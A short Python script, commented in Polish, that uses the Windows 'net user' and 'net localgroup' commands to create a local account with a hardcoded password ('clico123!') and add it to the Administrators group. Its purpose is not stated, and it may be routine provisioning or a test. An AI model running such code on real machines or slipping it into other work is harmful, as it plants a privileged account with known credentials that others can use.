import os
import subprocess

def create_admin_user(username, password):
    try:
        subprocess.run(['net', 'user', username, password, '/add'])
        subprocess.run(['net', 'localgroup', 'Administrators', username, '/add'])
    except Exception as e:
        print(f"Wystąpił błąd: {e}")

new_username = "ladmintest"
new_password = "clico123!"

create_admin_user(new_username, new_password)